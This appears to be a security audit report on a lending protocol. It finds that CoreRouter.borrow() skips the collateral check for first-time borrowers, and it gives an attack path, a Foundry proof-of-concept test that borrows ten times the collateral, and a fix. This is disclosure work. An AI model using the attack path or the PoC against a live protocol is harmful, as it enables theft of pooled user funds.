# First-time Borrowers Can Borrow Without Collateral Validation


*First-time borrowers will bypass collateral checks and steal funds from the protocol*

## Summary

*The incorrect collateral validation in CoreRouter.borrow() will cause a complete loss of funds for the protocol as first-time borrowers will bypass collateral checks and borrow more than their collateral allows.*

## Root Cause

In `CoreRouter.sol:156-160` there is a critical flaw in the collateral validation logic:

```solidity
uint256 borrowAmount = currentBorrow.borrowIndex != 0
    ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
    : 0; // For first-time borrowers, this will be 0!

require(collateral >= borrowAmount, "Insufficient collateral");
```

For first-time borrowers, `currentBorrow.borrowIndex` is 0, making `borrowAmount` also 0, which causes the collateral check to always pass regardless of the actual borrow amount.

## Internal Pre-conditions

1. User needs to be a first-time borrower for the specific lToken (never borrowed this asset before)
2. Protocol must have enough liquidity in the specific lToken
3. CoreRouter contract must be properly set up with at least one supported lToken

## External Pre-conditions

No specific external pre-conditions required.

## Attack Path

1. Attacker deposits minimal collateral (e.g., 1 USDC) into the protocol using `CoreRouter.supply()`
2. Attacker calls `CoreRouter.borrow()` with a large amount (e.g., 1,000,000 USDC) for the first time
3. The code calculates `borrowAmount = 0` since this is the first borrow
4. The check `require(collateral >= borrowAmount)` passes because 1 > 0
5. The borrowing proceeds despite insufficient collateral
6. Attacker receives the borrowed funds and can disappear, never repaying the loan

## Impact

*The protocol suffers a complete loss of the borrowed funds. The attacker gains the full amount borrowed without adequate collateral backing.*

Since all user positions are pooled at the CoreRouter level (the router is the actual holder of all lTokens), this vulnerability puts all user funds at risk. A single attacker can drain a significant portion of the protocol's liquidity by bypassing collateral checks on their first borrow.

## PoC
add this test to test/TestBorrowing.t.sol

```solidity
function test_first_time_borrower_bypass_collateral_check() public {
        vm.startPrank(deployer);
        
        // 1. Supply some collateral to ensure we're in a market
        uint256 collateralAmount = 100e18; // 100 tokens with 18 decimals
        address token = supportedTokens[0];
        address lToken = lendStorage.underlyingTolToken(token);
        
        // Enable token as collateral in Lendtroller
        address[] memory markets = new address[](1);
        markets[0] = lToken;
        lendtroller.enterMarkets(markets);
        
        // Mint tokens and supply as collateral
        ERC20Mock(token).mint(deployer, collateralAmount);
        IERC20(token).approve(address(coreRouter), collateralAmount);
        coreRouter.supply(collateralAmount, token);
        
        // Get initial token balance to verify the borrow
        uint256 initialBalance = IERC20(token).balanceOf(deployer);
        
        // 2. Try to borrow way more than collateral allows
        // In a normal system, this would be limited by the collateral factor
        // But due to the bug, first-time borrowers bypass the check
        uint256 largeAmount = 1000e18; // 1000 tokens - much more than collateral allows
        
        // Ensure protocol has enough liquidity
        ERC20Mock(token).mint(address(lToken), largeAmount * 2);
        
        // The vulnerability is here - CoreRouter calculates borrowAmount as 0 for first-time borrowers
        // and then incorrectly checks: require(collateral >= borrowAmount)
        // which passes because collateral >= 0 is always true
        coreRouter.borrow(largeAmount, token);
        
        // 3. Verify that the borrow actually succeeded
        uint256 newBalance = IERC20(token).balanceOf(deployer);
        uint256 borrowedAmount = newBalance - initialBalance;
        
        // Assert the vulnerability: we were able to borrow much more than our collateral allows
        assertEq(
            borrowedAmount,
            largeAmount,
            "First-time borrower should be able to borrow more than their collateral allows"
        );
        
        // Get the borrow state to verify the exploit
        LendStorage.BorrowMarketState memory borrowState = lendStorage.getBorrowBalance(deployer, lToken);
        assertEq(
            borrowState.amount,
            largeAmount,
            "Large borrow amount should be recorded correctly"
        );
        
        // The collateral factor should normally limit borrows to a percentage of collateral
        // (typically around 70-80%), so borrowing 10x collateral should be impossible
        uint256 collateralRatio = (collateralAmount * 100) / largeAmount;
        assertTrue(
            collateralRatio < 20, // Less than 20% collateralization
            "Collateral ratio should be extremely low, proving the bypass"
        );
        
        vm.stopPrank();
    }
```



## Mitigation

The CoreRouter should compare against the total borrowed value (including the new borrow) rather than relying on the current borrow state:

```solidity
// Fix: Use the borrowed amount directly from getHypotheticalAccountLiquidityCollateral
(uint256 borrowed, uint256 collateral) =
    lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

// This is the correct check that should be used
require(collateral >= borrowed, "Insufficient collateral");
```

The `getHypotheticalAccountLiquidityCollateral` function already correctly calculates the total borrow amount including the new borrow, so we should use its `borrowed` return value directly instead of recalculating it based on the current borrow index.
